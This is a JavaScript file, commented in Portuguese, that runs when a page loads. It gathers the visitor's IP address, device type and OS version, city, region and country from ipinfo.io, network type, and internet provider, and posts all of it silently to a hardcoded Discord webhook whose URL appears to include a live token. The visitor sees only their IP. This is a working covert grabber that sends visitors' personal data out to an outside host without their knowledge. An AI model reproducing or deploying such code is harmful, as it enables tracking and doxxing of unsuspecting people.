function getDeviceType(userAgent) {
    if (userAgent.match(/Windows/i)) {
        var version = userAgent.match(/Windows NT (\d+\.\d+)/i);
        return 'Windows';
    } else if (userAgent.match(/Macintosh|Mac OS/i)) {
        var version = userAgent.match(/(Mac OS X\s?|macOS\s?)?(\d+([._]\d+)+)/i);
        return 'Mac';
    } else if (userAgent.match(/Android/i)) {
        var version = userAgent.match(/Android (\d+(\.\d+)?)/i);
        return 'Android';
    } else if (userAgent.match(/iPhone|iPad|iPod/i)) {
        var version = userAgent.match(/OS (\d+([._]\d+)+)/i);
        return 'Apple';
    } else if (userAgent.match(/Huawei/i)) {
        return 'Huawei';
    } else if (userAgent.match(/Linux/i)) {
        return 'Linux';
    } else {
        return 'Unknown';
    }
}

function getVersion(userAgent) {
    if (userAgent.match(/Windows/i)) {
        var version = userAgent.match(/Windows NT (\d+\.\d+)/i);
        return version ? version[1] : 'Unknown';
    } else if (userAgent.match(/Macintosh|Mac OS/i)) {
        var version = userAgent.match(/(Mac OS X\s?|macOS\s?)?(\d+([._]\d+)+)/i);
        return version ? version[2].replace(/_/g, '.') : 'Unknown';
    } else if (userAgent.match(/Android/i)) {
        var version = userAgent.match(/Android (\d+(\.\d+)?)/i);
        return version ? version[1] : 'Unknown';
    } else if (userAgent.match(/iPhone|iPad|iPod/i)) {
        var version = userAgent.match(/OS (\d+([._]\d+)+)/i);
        return version ? version[1].replace(/_/g, '.') : 'Unknown';
    } else {
        return 'Unknown';
    }
}

function getLocation(ip) {
    // Usando a API ipinfo.io para obter informações de localização
    return fetch('https://ipinfo.io/' + ip + '/json')
        .then(function(response) {
            return response.json();
        });
}

function getNetworkType() {
    // Obtendo o tipo de conexão de rede do usuário
    if (navigator.connection && navigator.connection.effectiveType) {
        return navigator.connection.effectiveType;
    } else {
        return 'Unknown';
    }
}

function getInternetProvider(ip) {
    // Obtendo a operadora de internet do usuário usando a API ipinfo.io
    return fetch('https://ipinfo.io/' + ip + '/json')
        .then(function(response) {
            return response.json();
        })
        .then(function(data) {
            return data.org || 'Unknown';
        });
}

function displayDeviceInfo() {
    var userAgent = navigator.userAgent;
    var ip = '';

    fetch('https://api.ipify.org/?format=json')
        .then(function(response) {
            return response.json();
        })
        .then(function(data) {
            ip = data.ip;

            var deviceType = getDeviceType(userAgent);
            var deviceVersion = getVersion(userAgent);

            // Obter informações de localização do usuário
            getLocation(ip).then(function(locationData) {
                var location = locationData.city + ', ' + locationData.region + ', ' + locationData.country;

                // Obter o tipo de conexão de rede do usuário
                var networkType = getNetworkType();

                // Obter a operadora de internet do usuário
                getInternetProvider(ip).then(function(provider) {

                    // Agora você pode usar as variáveis 'deviceType', 'deviceVersion', 'location', 'networkType' e 'provider' para o que precisar.
                    // Por exemplo, você pode enviá-las para o Discord usando um webhook ou exibi-las em algum elemento HTML.

                    var webhook = 'https://discord.com/api/webhooks/1132359766644097055/bDThaWmWhb4MtKQesg4VqeMp895Pneu-y5wBkNBGWsGc-m_Nloe-IQjzg6iEfOw2NZGS';
                    var message = {
                        content: 'IP: ' + ip + '\nDispositivo: ' + deviceType + '\nVersão do Dispositivo: ' + deviceVersion + '\nLocalização: ' + location + '\nRede: ' + networkType + '\nOperadora de Internet: ' + provider
                    };

                    var ipElement = document.getElementById('ip');
                    ipElement.textContent = 'IP: ' + ip;

                    // Enviar a mensagem para o webhook do Discord
                    fetch(webhook, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(message)
                    });
                });
            });
        });
}

document.addEventListener('DOMContentLoaded', displayDeviceInfo);
